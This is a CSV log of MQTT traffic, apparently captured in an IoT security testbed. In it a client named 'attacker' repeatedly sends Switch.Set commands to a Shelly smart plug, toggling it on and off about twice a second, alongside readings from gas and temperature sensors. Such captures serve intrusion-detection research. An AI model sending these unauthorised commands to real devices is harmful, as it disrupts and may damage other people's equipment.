2026-04-22T16:19:16,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3909 33289.483 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:16,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:16,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33289.48,""swi"
2026-04-22T16:19:16,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3910 33289.501 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:17,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:17,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3911 33289.984 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:17,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:17,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33289.98,""swi"
2026-04-22T16:19:17,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3912 33290.000 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:17,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:17,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3913 33290.484 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:17,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:17,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33290.48,""swi"
2026-04-22T16:19:17,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3914 33290.502 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:18,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:18,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3915 33290.984 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:18,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:18,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33290.98,""swi"
2026-04-22T16:19:18,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3916 33291.000 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:18,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:18,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3917 33291.484 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:18,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:18,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33291.48,""swi"
2026-04-22T16:19:18,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3918 33291.503 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:19,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:19,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3919 33291.985 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:19,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:19,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33291.98,""swi"
2026-04-22T16:19:19,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3920 33292.001 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:19,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:19,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:19,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:19,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3921 33292.491 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:19,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:19,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33292.49,""swi"
2026-04-22T16:19:19,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3922 33292.509 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:20,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:20,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3923 33292.986 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:20,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:20,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33292.98,""swi"
2026-04-22T16:19:20,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3924 33293.002 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:20,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:20,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3925 33293.487 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:20,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:20,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33293.48,""swi"
2026-04-22T16:19:20,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3926 33293.505 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:21,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:21,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3927 33293.987 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:21,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:21,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33293.98,""swi"
2026-04-22T16:19:21,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3928 33294.004 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:21,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:21,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3929 33294.490 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:21,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:21,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33294.49,""swi"
2026-04-22T16:19:21,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3930 33294.509 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:22,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:22,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3931 33294.989 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:22,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:22,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33294.99,""swi"
2026-04-22T16:19:22,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3932 33295.005 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:22,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:22,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3933 33295.488 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:22,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:22,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33295.49,""swi"
2026-04-22T16:19:22,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3934 33295.507 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:23,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:23,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3935 33295.989 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:23,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:23,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33295.99,""swi"
2026-04-22T16:19:23,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3936 33296.006 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:23,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:23,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3937 33296.490 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:23,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:23,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33296.49,""swi"
2026-04-22T16:19:23,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3938 33296.508 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:24,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:24,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3939 33296.990 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:24,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:24,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33296.99,""swi"
2026-04-22T16:19:24,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3940 33297.006 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:24,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:24,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:24,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:24,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3941 33297.494 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:24,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:24,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33297.49,""swi"
2026-04-22T16:19:24,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3942 33297.513 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:25,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:25,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3943 33297.994 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:25,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:25,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33297.99,""swi"
2026-04-22T16:19:25,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3944 33298.011 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:25,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:25,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3945 33298.495 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:25,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:25,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33298.49,""swi"
2026-04-22T16:19:25,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3946 33298.515 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:26,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:26,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3947 33298.996 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:26,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:26,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33298.99,""swi"
2026-04-22T16:19:26,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3948 33299.013 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:19:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:19:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:19:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:19:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:19:26,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:26,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3949 33299.496 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:26,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:26,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33299.49,""swi"
2026-04-22T16:19:26,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3950 33299.515 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:27,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:27,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3951 33299.997 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:27,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:27,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33299.99,""swi"
2026-04-22T16:19:27,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3952 33300.013 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:27,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:27,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3953 33300.506 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:27,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:27,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33300.50,""swi"
2026-04-22T16:19:27,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3954 33300.525 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:28,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:28,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3955 33300.997 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:28,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:28,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33300.99,""swi"
2026-04-22T16:19:28,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3956 33301.014 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:28,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:28,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3957 33301.499 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:28,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:28,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33301.50,""swi"
2026-04-22T16:19:28,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3958 33301.518 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:29,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:29,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3959 33301.998 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:29,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:29,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33301.99,""swi"
2026-04-22T16:19:29,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3960 33302.014 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:29,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:29,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:29,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
